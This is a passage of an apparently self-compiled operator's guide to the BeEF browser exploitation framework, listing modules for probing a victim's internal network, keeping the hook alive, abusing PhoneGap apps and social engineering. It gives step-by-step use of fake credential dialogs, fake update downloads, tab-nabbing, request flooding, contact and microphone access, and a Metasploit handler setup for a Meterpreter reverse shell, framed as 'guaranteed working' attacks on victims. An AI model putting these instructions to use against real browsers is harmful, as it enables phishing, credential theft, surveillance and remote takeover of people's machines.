### 11.11 IBM iNotes Modules
Require hook to run in IBM iNotes origin context.

| Module | Action |
|--------|--------|
| Extract iNotes List | Lists all notes |
| Read iNotes | Reads a specific note |
| Send iNotes | Sends a note to someone |
| Send iNotes with Attachment | Sends note with file attachment |
| Flooder | Floods target with notes |

---

## 12. NETWORK Modules

These use the hooked browser to probe and map the victim's internal network.

---

### 12.1 Ping Sweep (JS XHR)
**What it does:** Discovers active hosts on the victim's internal network by timing XHR request responses.
**Works on:** All browsers
**Parameters:**
- `IP Range` — e.g. `192.168.1.1-192.168.1.254` or `common` for common LAN ranges
**How to run:** Set IP range → Execute → wait for timing results
**Guaranteed to work when:** Any browser is hooked on an internal network.

---

### 12.2 Ping Sweep (FF)
**What it does:** Same as above but uses a Java method call (faster, more accurate).
**Works on:** Firefox only
**Parameters:** IP Range

---

### 12.3 Ping Sweep (Java)
**What it does:** Same but uses unsigned Java applet.
**Works on:** All browsers with Java plugin
**Parameters:** IP Range

---

### 12.4 Port Scanner (Multiple Methods)
**What it does:** Scans ports on a target using WebSockets, CORS, and image tags simultaneously for maximum accuracy.
**Works on:** All browsers
**Parameters:**
- `Target IP` — host to scan
- `Ports` — comma-separated list
**Note:** Authentication popups may appear if web servers on scanned ports use HTTP auth.

---

### 12.5 Fetch Port Scanner
**What it does:** Uses the `fetch()` API to determine if ports are open.
**Works on:** Chrome, Firefox (modern)
**Parameters:** Target IP, port range

---

### 12.6 Fingerprint Local Network
**What it does:** Identifies devices on the internal network using signature-based detection (comparing default logos/favicons against known device types — routers, NAS, cameras, etc.).
**Works on:** All browsers
**Parameters:** IP range (use `common` for common LAN addresses)
**Returns:** Device type, manufacturer, model where identified

---

### 12.7 Fingerprint Routers
**What it does:** Discovers network routers by scanning common router IP addresses and comparing default images.
**Works on:** All browsers
**Parameters:** IP range
**Note:** May trigger HTTP auth popups on protected admin panels.

---

### 12.8 Get HTTP Servers (Favicon)
**What it does:** Discovers HTTP servers on internal IP range by checking for favicon presence.
**Works on:** All browsers
**Parameters:** IP range

---

### 12.9 Cross-Origin Scanner (CORS)
**What it does:** Scans IP range for web servers with permissive CORS headers that allow cross-origin requests.
**Works on:** All browsers
**Parameters:** IP range (`common` for common LAN)
**Returns:** Full HTTP response from permissive servers

---

### 12.10 Cross-Origin Scanner (Flash)
**What it does:** Scans for servers with permissive Flash cross-domain policy (`crossdomain.xml`).
**Works on:** All browsers with Flash
**Note:** Flash is EOL — not useful on modern browsers.

---

### 12.11 Detect Social Networks
**What it does:** Detects if the victim is currently logged into Gmail, Facebook, or Twitter.
**Works on:** All browsers
**Parameters:** None
**How it works:** Makes timing-based requests to authenticated endpoints
**Guaranteed to work when:** Any browser is hooked.

---

### 12.12 Detect Tor
**What it does:** Checks if victim is using Tor by testing connection to known Tor check endpoints.
**Works on:** All browsers
**Parameters:** None

---

### 12.13 Detect Burp
**What it does:** Checks if the victim's browser is routing traffic through Burp Suite proxy.
**Works on:** All browsers
**Returns:** Burp proxy IP address if detected

---

### 12.14 Detect OpenNIC DNS / Detect Ethereum ENS
**What they do:** Detect if victim uses alternative DNS resolvers.
**Works on:** All browsers (may fail on HTTPS pages loading HTTP resources)

---

### 12.15 DNS Enumeration
**What it does:** Discovers DNS hostnames on the victim's network using dictionary attacks and timing.
**Works on:** All browsers
**Parameters:** Target domain, wordlist

---

### 12.16 DNS Rebinding
**What it does:** Performs a DNS rebinding attack to bypass Same-Origin Policy and access internal services.
**Works on:** All browsers
**Requirements:** DNS Rebinding extension must be enabled in `config.yaml`

---

### 12.17 Identify LAN Subnets
**What it does:** Discovers which internal subnets the victim's machine is connected to by timing connection attempts.
**Works on:** All browsers
**Parameters:** None
**Guaranteed to work when:** Any browser is hooked on an internal network.

---

### 12.18 Get Proxy Servers (WPAD)
**What it does:** Retrieves proxy server addresses via WPAD (Web Proxy Auto-Discovery Protocol).
**Works on:** All browsers
**Requirements:** Victim's network must have WPAD configured

---

### 12.19 Get ntop Network Hosts
**What it does:** Retrieves network topology from ntop (unauthenticated access).
**Works on:** All browsers
**Target:** ntop v4.1.0–5.0.1 (not ntop-ng)

---

### 12.20 DOSer
**What it does:** Floods a target URL with infinite GET or POST requests using a WebWorker thread.
**Works on:** All modern browsers
**Parameters:** Target URL, GET or POST, request data
**Note:** Uses WebWorker to avoid slowing down the hooked page. If WebWorker not supported, module will not run.

---

### 12.21 F5 BigIP Cookie Disclosure
**What it does:** Decodes F5 BigIP persistent cookies to reveal backend pool name, real IP, and port.
**Works on:** All browsers
**Parameters:** None
**Requirements:** Victim must be behind an F5 BigIP load balancer

---

### 12.22 IRC NAT Pinning
**What it does:** Opens closed ports on stateful firewalls by exploiting IRC connection tracking, creating NAT pinholes.
**Works on:** All browsers
**Parameters:** None
**BeEF auto-binds:** Port 6667 (IRC)

---

## 13. PERSISTENCE Modules

These keep the BeEF hook alive even after the victim navigates away.

---

### 13.1 Man-In-The-Browser
**What it does:** Hooks into the page navigation events to maintain the BeEF hook for as long as the victim stays on the same domain.
**Works on:** All browsers
**Parameters:** None
**How to run:** Execute as soon as browser is hooked — before victim navigates away
**Guaranteed to work when:** Victim stays on the same domain. Does NOT survive navigation to different domains.

---

### 13.2 Create Foreground iFrame
**What it does:** Rewrites all page links to open in a 100%×100% iFrame, keeping the parent (hooked) page alive while content loads inside.
**Works on:** All browsers
**Parameters:** None
**Effect:** Victim can click links and "browse" normally, but the hook remains.

---

### 13.3 Create Pop Under
**What it does:** Opens a hidden background popup window containing the hook.
**Works on:** All browsers (popup blockers may interfere)
**Parameters:**
- `Clickjack` option — triggers popup on user click to bypass popup blockers
**Note:** Modern browsers block popups by default. Enable Clickjack option to wait for user interaction.

---

### 13.4 Create Pop Under (IE)
**What it does:** Same as above but uses HTMLFile ActiveX to bypass IE's popup blocker.
**Works on:** IE only
**Parameters:** None

---

### 13.5 Invisible HTMLFile (ActiveX)
**What it does:** Creates a hidden HTML document via ActiveX containing the BeEF hook — persists until the tab is closed.
**Works on:** IE only
**Parameters:** None

---

### 13.6 Hijack Opener Window
**What it does:** Uses `window.opener` to take over the window that opened the hooked page, replacing it with a hook + iframe.
**Works on:** All browsers
**Requirements:** Hooked page must have been opened from another window/tab via a link
**Note:** Will not work if the originating link used `noopener` or `noreferrer`.

---

### 13.7 Confirm Close Tab
**What it does:** Traps the victim in the tab by showing a confirm dialog every time they try to close it.
**Works on:** All browsers except Opera ≥v12, Chrome (Chrome limits repeated dialogs)
**Parameters:** None

---

### 13.8 JSONP Service Worker
**What it does:** Exploits an unfiltered JSONP callback parameter on the compromised domain to re-hook every time the victim visits that domain.
**Works on:** All browsers
**Requirements:** JSONP endpoint with unfiltered callback parameter on same domain

---

## 14. PHONEGAP Modules

These require the target to be a PhoneGap (Apache Cordova) hybrid mobile app with `window.PhoneGap` or `window.cordova` available.

---

| Module | What it does | Requirements |
|--------|-------------|--------------|
| Detect PhoneGap | Checks if PhoneGap API is present | Any browser |
| Alert User | Shows native alert | PhoneGap API |
| Beep | Makes phone beep | PhoneGap API |
| Check Connection | Gets network type (WiFi, 3G, etc.) | PhoneGap API |
| Upload File | Uploads files from device to remote server | PhoneGap API |
| Geolocation | Gets precise GPS coordinates | PhoneGap API |
| Globalization Status | Reads locale/language settings | PhoneGap API |
| Keychain | Read/write/delete iOS Keychain items | PhoneGap API + iOS |
| List Contacts | Reads all device contacts | PhoneGap API |
| List Files | Lists device filesystem | PhoneGap API |
| List Plugins | Guesses installed Cordova plugins | PhoneGap API |
| Persistence (PhoneGap) | Injects hook into app's index.html | PhoneGap + iPhone |
| Persist resume | Survives app sleep/wake cycles | PhoneGap API |
| Prompt User | Shows native prompt dialog | PhoneGap API |
| Start/Stop Recording Audio | Controls device microphone | PhoneGap API |

**How to use PhoneGap modules:**
1. Run Detect PhoneGap first to confirm it's available
2. If confirmed, all other modules become usable

---

## 15. SOCIAL ENGINEERING Modules

These manipulate the victim into taking an action.

---

### 15.1 Pretty Theft
**What it does:** Displays a convincing floating credential dialog overlaid on the current page asking for username/password.
**Works on:** ALL browsers
**Parameters:**
- `Dialog Type` — Google, Facebook, LinkedIn, Windows, generic
- `Backdrop` — with or without blurred background
**Guaranteed to work when:** Any browser is hooked and victim enters credentials.

---

### 15.2 Fake Flash Update
**What it does:** Shows a fake "Adobe Flash Player Update Required" popup pointing to attacker-controlled download.
**Works on:** ALL browsers
**Parameters:** `Update URL` — URL to malicious file
**Guaranteed to work when:** Any browser is hooked. Victim must click and run the download.

---

### 15.3 Fake Notification Bar (Chrome / Firefox / IE)
**What it does:** Injects a pixel-perfect fake browser notification bar at the top of the screen matching the victim's browser style.
**Works on:** Each variant targets its respective browser
**Parameters:** File URL to serve for download
**Guaranteed to work when:** Victim uses matching browser and clicks the bar.

---

### 15.4 Fake LastPass
**What it does:** Displays a fake LastPass login dialog.
**Works on:** All browsers
**Parameters:** None
**Returns:** Credentials victim enters into the fake dialog

---

### 15.5 Fake Evernote Web Clipper Login
**What it does:** Displays a fake Evernote Web Clipper login dialog.
**Works on:** All browsers
**Parameters:** None

---

### 15.6 Clickjacking
**What it does:** Overlays an invisible iframe that follows the victim's mouse cursor — any click lands on attacker-controlled content.
**Works on:** ALL browsers
**Parameters:**
- `x-pos`, `y-pos` — iframe position
- `iframe URL` — what to load under the cursor
- Optional JS on click
**How to run:** Set target x/y coordinates → Execute → every victim click triggers your iframe

---

### 15.7 TabNabbing
**What it does:** Waits for the tab to become inactive (victim switched to another tab), then replaces the page content with a phishing page. When victim returns, they see the fake page.
**Works on:** ALL browsers
**Parameters:**
- `Redirect URL` — phishing page to load
- `Timeout` — how many seconds of inactivity before redirect
**Guaranteed to work when:** Any browser is hooked and victim switches tabs.

---

### 15.8 Google Phishing
**What it does:** Repeatedly logs victim out of Gmail via XSRF, then presents a Gmail phishing page (with Google favicon and realistic URL in iframe).
**Works on:** All browsers
**Parameters:** None

---

### 15.9 Simple Hijacker
**What it does:** Intercepts all link clicks on the page and redirects to attacker-chosen content.
**Works on:** ALL browsers
**Parameters:** URL to redirect to

---

### 15.10 Spoof Address Bar (data URL)
**What it does:** Redirects the browser to a `data:text/html,...` URL that shows a spoofed domain in the address bar while loading attacker content in an iframe.
**Works on:** All browsers (most have patched this)
**Parameters:** Target URL to spoof, iframe URL

---

### 15.11 HTA PowerShell (Windows only)
**What it does:** Appends a hidden HTA (HTML Application) to the DOM in an iframe. If victim clicks "Allow", PowerShell downloads and runs a Meterpreter payload.
**Works on:** IE, Edge (legacy)
**Requirements:** Metasploit multi/handler running:
```
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_https
set LHOST <your_ip>
set LPORT 443
exploit -j -z
```
**Parameters:**
- `LHOST` — your IP
- `LPORT` — listening port (default 443)
- `Payload URL` — auto-populated if Metasploit extension enabled

---

### 15.12 Firefox Extension Modules
These create malicious Firefox extensions on-the-fly:

| Module | What it delivers |
|--------|----------------|
| Firefox Extension (Bindshell) | Extension that binds a shell on specified port |
| Firefox Extension (Dropper) | Extension that downloads and runs a dropper file |
| Firefox Extension (Reverse Shell) | Extension that connects back to attacker's host:port |

**Works on:** Firefox only
**How to use:** Execute → victim is prompted to install an extension → if they accept, payload runs

---

### 15.13 Edge WScript WSH Injection
**What it does:** Prompts victim to run Windows Script Host (WScript.exe) via `wshfile:` protocol handler. If allowed, downloads and executes a VBS payload.
**Works on:** Edge (legacy)
**Parameters:** Commands to execute

---

### 15.14 Clippy
**What it does:** Shows a Clippy-style paperclip assistant popup suggesting the victim download and run a file.
**Works on:** ALL browsers
**Parameters:** Executable URL, message text

---

### 15.15 Replace Videos (Fake Plugin)
**What it does:** Replaces embedded video elements with a "plugin missing" image. If victim clicks, they download an attacker file.
**Works on:** ALL browsers
**Parameters:** jQuery selector, download URL

---

### 15.16 Text to Voice
**What it does:** Converts text to MP3 and plays it on the hooked browser.
**Works on:** All browsers
**Requirements:** `lame` and `espeak` must be installed on the BeEF server
**Install:**
```bash
sudo apt-get install lame espeak
```

---

### 15.17 SiteKiosk Breakout
**What it does:** Breaks out of SiteKiosk kiosk mode using HTA and launches a Meterpreter reverse shell.
**Works on:** IE/Edge in SiteKiosk kiosk environment
**Requirements:** Metasploit `exploit/windows/misc/psh_web_delivery` running

---

### 15.18 User Interface Abuse (IE 9/10)
**What it does:** Uses a fake CAPTCHA to trick victim into pressing a keyboard shortcut (TAB+R for IE9, R for IE10) that executes a signed binary via the Run dialog.
**Works on:** IE 9 and IE 10 only
**Requirements:** Signed executable served same-origin from BeEF

---

### 15.19 Lcamtuf Download
**What it does:** Forces a file download using a custom `Content-Disposition: attachment` header trick.
**Works on:** All browsers
**Parameters:** File URL

---

## 16. Guaranteed Working Combinations

These are combinations of browser + module that are **confirmed to work** regardless of specific version:

### Tier 1 — Work on ANY browser, ANY version, NO special conditions

| Module | Category |
|--------|---------|
| Get Cookie | Browser |
| Get Page HTML | Browser |
| Get Page HREFs | Browser |
| Get Form Values | Browser |
| Fingerprint Browser | Browser |
| Raw JavaScript | Misc |
| Redirect Browser (Standard) | Browser |
| Redirect Browser (iFrame) | Browser |
| Create Alert Dialog | Browser |
| Link Rewrite | Browser |
| Link Rewrite (HTTPS) | Browser |
| Link Rewrite (TEL) | Browser |
| Link Rewrite (Click Events) | Browser |
| Create Invisible iFrame | Misc |
| Replace Content (Deface) | Browser |
| Remove Hook Element | Browser |
| Unhook | Browser |
| Detect Foxit Reader | Browser |
| Detect QuickTime | Browser |
| Detect RealPlayer | Browser |
| Detect Toolbars | Browser |
| Detect Unity Web Player | Browser |
| Detect Windows Media Player | Browser |
| Detect Silverlight | Browser |
| Identify LAN Subnets | Network |
| Ping Sweep (JS XHR) | Network |
| Detect Social Networks | Network |
| Get Geolocation (Third-Party) | Host |
| Pretty Theft | Social Engineering |
| Fake Flash Update | Social Engineering |
| TabNabbing | Social Engineering |
| Simple Hijacker | Social Engineering |
| Man-In-The-Browser | Persistence |
| Create Foreground iFrame | Persistence |
| DOSer | Network |

### Tier 2 — Work on Firefox AND Chrome (modern browsers, most common)

| Module | Notes |
|--------|-------|
| Get Autocomplete Credentials | Must have saved credentials |
| Get Local Storage | IE8+/FF4+/C4+/S4+ |
| Get Session Storage | IE8+/FF4+/C4+/S4+ |
| Spyder Eye | Best on HTTPS pages |
| Overflow Cookie Jar | |
| Play Sound | IE9+/FF3+/S4+ |
| Fingerprint Ajax | FF and Safari only |
| Port Scanner (Multiple Methods) | |
| Cross-Origin Scanner (CORS) | |
| Fingerprint Local Network | |
| Fingerprint Routers | |

### Tier 3 — Work on specific browser only

| Module | Browser |
|--------|---------|
| Webcam HTML5 | Chrome/Firefox — HTTPS required |
| Detect MS Office | IE only |
| Detect FireBug | Firefox only |
| Detect Simple Adblock | IE only |
| Disable Developer Tools | IE 8–11 only |
| Get Stored Credentials | Firefox only |
| Firefox Extension (any) | Firefox only |
| Pop Under (IE) | IE only |
| Invisible HTMLFile (ActiveX) | IE only |
| ActiveX Command Execution | IE only |
| HTA PowerShell | IE/Edge only |
| Detect Evernote Web Clipper | Chrome only |
| Clear Console | Chrome only |
| iOS Address Bar Spoofing | Safari iOS only |
| Track Physical Movement | iOS only |
| No Sleep | iOS/Android only |

---

## Quick Reference — How to Execute Any Module

```
1. Start server        →  ./start
2. Hook victim         →  victim opens http://YOUR_IP:3000/demos/sample.html
3. Open admin panel    →  http://localhost:3000/ui/authentication
4. Select browser      →  click hooked browser in left panel
5. Go to Commands tab  →  find module in Module Tree
6. Set parameters      →  fill in any required fields
7. Execute             →  click Execute button
8. View results        →  Command History tab (bottom panel)
```

---

*Generated from BeEF Framework v0.5.4.0 source — /home/vexo/project/OPERATING-SYSTEM-ANALYSIS/Applications/main-server*
